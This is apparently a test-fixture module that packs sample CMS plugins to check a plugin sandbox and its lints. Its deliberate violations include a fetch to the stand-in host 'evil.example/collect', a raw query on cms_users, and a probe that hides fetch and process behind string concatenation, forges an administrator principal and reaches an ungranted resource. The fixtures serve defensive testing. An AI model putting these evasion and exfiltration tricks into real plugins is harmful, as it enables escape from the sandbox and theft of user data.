// A CMS plugin package: a resource, a before-write hook, a dashboard view, a slot widget,
// a block type and a command. Variants break one policy rule each, or change the schema.
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const run = promisify(execFile);

export function deskManifest(version, overrides = {}) {
  return {
    schemaVersion: 1, name: 'support-desk', version, description: 'Support tickets',
    compatibility: { '@cossackframework/cms': '>=0.9.0' },
    resources: [{
      name: 'tickets', label: 'Tickets', titleField: 'subject', ownership: true,
      fields: {
        subject: { kind: 'string', required: true, max: 120, search: true, ...(overrides.uniqueSubject ? { unique: true } : {}) },
        status: { kind: 'enum', values: ['open', 'closed'], required: true, default: 'open', index: true },
        body: { kind: 'text', search: true },
      },
      access: { read: 'authenticated', create: 'authenticated', update: { any: ['owner', { permission: 'support-desk/tickets:update' }] }, delete: { permission: 'support-desk/tickets:delete' } },
    }],
    blocks: [{ name: 'support-desk/contact', label: 'Support contact', fields: { email: { kind: 'string', required: true, max: 120, label: 'Email' } } }],
    // A pattern of a core block and the plugin's own, stored when the plugin is granted.
    patterns: [{ slug: 'contact-card', title: 'Contact card', blocks: [{ _id: 'h', type: 'core/heading', data: { text: 'Talk to us', level: 'h2' } }, { _id: 'c', type: 'support-desk/contact', data: { email: 'help@example.com' } }] }],
    // A field group for posts, stored when the plugin is granted, and a Support tab holding it while the plugin is active.
    fieldGroups: [{ id: 'support-desk-support', title: 'Support', targets: [{ kind: 'collection', name: 'posts' }],
      blocks: [{ _id: 'priority', type: 'field/choice', data: { label: 'Priority', name: 'supportPriority', choices: ['low', 'high'] } }] }],
    editor: [{ collection: 'posts', tabs: [{ _id: 'support', type: 'editor/tab', data: { label: 'Support' }, children: [{ _id: 'box', type: 'editor/box', data: { box: 'group:support-desk-support' } }] }] }],
    hooks: [{ point: 'cms.resource.before-write', version: 1 }, { point: 'cms.cache.purge', version: 1 }],
    // Capabilities beyond its data: jobs (and the schedule below), the cache and mail; granted with the rest.
    permissions: { resources: { 'cms/posts': ['read'] }, define: ['support-desk:triage'], jobs: true, cache: true, mail: true },
    schedules: [{ name: 'heartbeat', cron: '* * * * *', description: 'Logs that the desk is alive.' }],
    ui: { slots: { 'dashboard.nav': [{ label: 'Support', href: '/dashboard/support' }] } },
    commands: [{ name: 'close-all', description: 'Close every open ticket.', permission: 'support-desk:triage', options: { reason: { type: 'string', description: 'Why the tickets close.' } } }],
  };
}

const server = (extra = '') => `import { beforeWrite, cachePurge } from '@cossackframework/cms';
import type { PluginContext } from '@cossackframework/cms/server';

export function register(context: PluginContext) {
  context.hooks.addFilter(beforeWrite, (draft, { input }) =>
    input.resource === 'support-desk/tickets' && typeof draft.subject === 'string' ? { ...draft, subject: draft.subject.trim() } : draft);
  // A purger for another CDN: the same events the application's purgers get.
  context.hooks.addAction(cachePurge, event => { console.log(\`[support-desk] purge \${event.reason} \${event.tags.join(' ')}\`); });
  // Jobs: queued by the command below, and by the clock through the manifest's schedule.
  context.jobs.handle('notify', async payload => {
    await context.cache.set('last-close', payload, 60_000);
    console.log(\`[support-desk] job notify \${JSON.stringify(payload)}\`);
  });
  context.jobs.handle('heartbeat', (_payload, { scheduledAt }) => { console.log(\`[support-desk] heartbeat \${scheduledAt}\`); });
  context.commands.add('close-all', async (input, { principal }) => {
    const tickets = context.cms.resource('support-desk/tickets');
    const page = await tickets.list({ where: { status: 'open' }, limit: 100 }, { principal });
    for (const ticket of page.records) await tickets.update(ticket.id, { status: 'closed' }, { principal, expectedRevision: ticket.rev });
    await context.jobs.enqueue('notify', { closed: page.records.length }, { key: \`close-all-\${page.records.length}\` });
    return { closed: page.records.length, reason: input.reason ?? null };
  });
${extra}}
`;

const sources = {
  'server.ts': server(),
  'pages/dashboard/support/index.ts': `import { Cossack, Page, State } from '@cossackframework/core';
import { html } from '@cossackframework/renderer';

@Page({ transport: 'http' })
export default class SupportDesk extends Cossack {
  @State() open = 0;
  @State() error = '';

  async init() {
    try {
      const tickets = this.c.get('cms').pluginCms('support-desk').resource('support-desk/tickets');
      this.open = (await tickets.list({ where: { status: 'open' }, limit: 100 }, { principal: this.c.get('principal') })).records.length;
    } catch (error) {
      this.error = (error as Error).message;
    }
  }

  render() {
    return html\`<div class="space-y-2">
      <h1 class="text-2xl font-bold">Support</h1>
      <p data-testid="open-tickets">Open tickets: \${this.open}</p>
      \${this.error ? html\`<p role="alert">\${this.error}</p>\` : null}
    </div>\`;
  }
}
`,
  'ui.ts': `import { Component, Cossack } from '@cossackframework/core';
import type { PluginHead } from '@cossackframework/cms';
import { html } from '@cossackframework/renderer';

@Component()
export class SupportWidget extends Cossack {
  render() {
    return html\`<div class="rounded-lg border border-border p-4" data-testid="support-widget">Support desk is active</div>\`;
  }
}

/** Renders the support-desk/contact block on the site. */
@Component()
export class SupportContact extends Cossack {
  declare props: { block: { data: { email?: string } } };
  render() {
    return html\`<p data-testid="support-contact">Write to \${this.props.block.data.email ?? ''}</p>\`;
  }
}

/** Components for CMS host slots. */
export const slots = { 'dashboard.overview': [SupportWidget] };

/** Block renderers by block name. */
export const blocks = { contact: SupportContact };

/** Tags for the head of every site page while the plugin is active. */
export const head: PluginHead = (site, helpers, plugin) => ({ meta: [{ tag: 'meta', attributes: { name: 'support-desk', content: plugin.asset('assets/none.css') || 'on' } }] });
`,
};

export const violations = {
  raw: { 'server.ts': server(`  void 'SELECT * FROM cms_users WHERE id = 1';\n`) },
  network: { 'server.ts': server(`  void fetch('https://evil.example/collect');\n`) },
  permission: { 'server.ts': server(`  context.commands.add('noop', async (_input, { principal }) => hasPermission(principal, 'cms:users'));\n`).replace("import { beforeWrite } from '@cossackframework/cms';", "import { beforeWrite, hasPermission } from '@cossackframework/cms';") },
};

/** A plugin asking for unrestricted access and using it, in code the lints refuse from any other plugin. */
export async function packVault(version = '1.0.0') {
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), `vault-cms-${version}-`));
  const all = {
    'package.json': JSON.stringify({ name: '@acme/vault', version, type: 'module', cossack: { plugin: 'cossack-plugin.json' }, files: ['plugin', 'cossack-plugin.json'] }),
    'cossack-plugin.json': JSON.stringify({ schemaVersion: 1, name: 'vault', version, description: 'Reads the database directly',
      permissions: { unrestricted: true }, commands: [{ name: 'count', description: 'Count the stored settings.' }] }, null, 2),
    'plugin/server.ts': `import type { PluginContext } from '@cossackframework/cms/server';

declare const process: { env: Record<string, string | undefined> };

export function register(context: PluginContext) {
  context.commands.add('count', async () => {
    const { db, env } = await context.unrestricted();
    const result = await db.read([{ rql: 'SELECT count(*) FROM cms_settings' }]);
    return { settings: Number(result.results[0]!.rows[0]![0]), binding: typeof env.ROMEDB_URL, token: typeof process.env.ROMEDB_TOKEN, network: typeof fetch };
  });
}
`,
  };
  for (const [rel, content] of Object.entries(all)) {
    await fs.mkdir(path.dirname(path.join(directory, rel)), { recursive: true });
    await fs.writeFile(path.join(directory, rel), content);
  }
  const { stdout } = await run('npm', ['pack', '--ignore-scripts', '--silent', '--pack-destination', directory], { cwd: directory });
  return { directory, tarball: path.join(directory, stdout.trim().split('\n').pop()) };
}

/**
 * A plugin with only server code: on Cloudflare it runs isolated, on Node in the application.
 * Its probe reaches for the global fetch and process in ways the build's lints cannot see, so
 * only the Worker it runs in stops it.
 */
export async function packIsolated(version = '1.0.0') {
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), `tickets-probe-${version}-`));
  const all = {
    'package.json': JSON.stringify({ name: '@acme/tickets-probe', version, type: 'module', cossack: { plugin: 'cossack-plugin.json' }, files: ['plugin', 'cossack-plugin.json'] }),
    'cossack-plugin.json': JSON.stringify({ schemaVersion: 1, name: 'tickets-probe', version, description: 'Tickets, with server code only',
      resources: [{ name: 'tickets', label: 'Tickets', titleField: 'subject', fields: { subject: { kind: 'string', required: true, max: 120 }, status: { kind: 'string', max: 20 } } }],
      hooks: [{ point: 'cms.resource.before-write', version: 1 }, { point: 'cms.resource.after-commit', version: 1 }],
      permissions: { jobs: true },
      commands: [
        { name: 'open', description: 'Open a ticket.', options: { subject: { type: 'string', description: 'What it is about.' } } },
        { name: 'show', description: 'Show a ticket.', options: { id: { type: 'string', description: 'The ticket.' } } },
        { name: 'probe', description: 'Reach for what the plugin was not given.' },
      ] }, null, 2),
    'plugin/server.ts': `import { afterCommit, beforeWrite, systemPrincipal, userPrincipal } from '@cossackframework/cms';
import type { PluginContext } from '@cossackframework/cms/server';

const TICKETS = 'tickets-probe/tickets';
/** Found in the application's bundle only when the plugin's code is part of it. */
const MARK = 'tickets-probe-marker';

export function register(context: PluginContext) {
  const own = { principal: systemPrincipal('plugin:tickets-probe') };
  const tickets = context.cms.resource('tickets-probe/tickets');
  context.hooks.addFilter(beforeWrite, (draft, { input }) =>
    input.resource === TICKETS && typeof draft.subject === 'string' && !draft.subject.endsWith(' [checked]') ? { ...draft, subject: \`\${draft.subject.trim()} [checked]\` } : draft);
  context.hooks.addAction(afterCommit, async event => {
    if (event.resource === TICKETS && event.topic === 'resource.created') await context.jobs.enqueue('triage', { id: event.id }, { key: \`triage-\${event.id}\` });
  });
  context.jobs.handle('triage', async (payload: { id: string }) => {
    const ticket = await tickets.get(payload.id, own);
    if (ticket && ticket.status !== 'triaged') await tickets.update(payload.id, { status: 'triaged' }, { ...own, expectedRevision: ticket.rev });
    console.log(\`[tickets-probe] triaged \${payload.id}\`);
  });
  context.commands.add('open', async input => {
    const created = await tickets.create({ subject: String(input.subject), status: 'open' }, own);
    return { id: created.id, subject: created.subject };
  });
  context.commands.add('show', async input => {
    const ticket = await tickets.get(String(input.id), own);
    return ticket ? { subject: ticket.subject, status: ticket.status } : null;
  });
  context.commands.add('probe', async (_input, { principal }) => {
    const global = globalThis as unknown as Record<string, unknown>;
    const reach = Reflect.get(global, 'fe' + 'tch') as typeof fetch;
    const host = Reflect.get(global, 'pro' + 'cess') as { env?: Record<string, unknown> } | undefined;
    const code = (error: unknown) => (error as { code?: string }).code ?? String((error as Error).message);
    return {
      fetch: await reach('https://example.com/').then(() => 'reached', error => String((error as Error).message)),
      env: host?.env ? Object.keys(host.env).length : 0,
      // Named so the lint cannot follow; the host refuses it anyway.
      ungranted: await (async () => (Reflect.get(context.cms, 'resource') as (id: string) => typeof tickets).call(context.cms, ['cms', 'pages'].join('/')).list({ limit: 1 }, own))().then(() => 'allowed', code),
      forged: await tickets.list({ limit: 1 }, { principal: userPrincipal('forged', ['administrator'], ['*']) }).then(() => 'allowed', code),
      given: principal.kind,
      marker: MARK,
    };
  });
}
`,
  };
  for (const [rel, content] of Object.entries(all)) {
    await fs.mkdir(path.dirname(path.join(directory, rel)), { recursive: true });
    await fs.writeFile(path.join(directory, rel), content);
  }
  const { stdout } = await run('npm', ['pack', '--ignore-scripts', '--silent', '--pack-destination', directory], { cwd: directory });
  return { directory, tarball: path.join(directory, stdout.trim().split('\n').pop()) };
}

/** Write the package and pack it; returns `{ directory, tarball }`. */
export async function packDesk(version, { files = {}, manifest = {} } = {}) {
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), `support-desk-cms-${version}-`));
  const all = {
    'package.json': JSON.stringify({ name: '@acme/support-desk', version, type: 'module', cossack: { plugin: 'cossack-plugin.json' }, files: ['plugin', 'cossack-plugin.json'] }, null, 2),
    'cossack-plugin.json': JSON.stringify(deskManifest(version, manifest), null, 2),
    ...Object.fromEntries(Object.entries({ ...sources, ...files }).map(([rel, content]) => [`plugin/${rel}`, content])),
  };
  for (const [rel, content] of Object.entries(all)) {
    await fs.mkdir(path.dirname(path.join(directory, rel)), { recursive: true });
    await fs.writeFile(path.join(directory, rel), content);
  }
  const { stdout } = await run('npm', ['pack', '--ignore-scripts', '--silent', '--pack-destination', directory], { cwd: directory });
  return { directory, tarball: path.join(directory, stdout.trim().split('\n').pop()) };
}
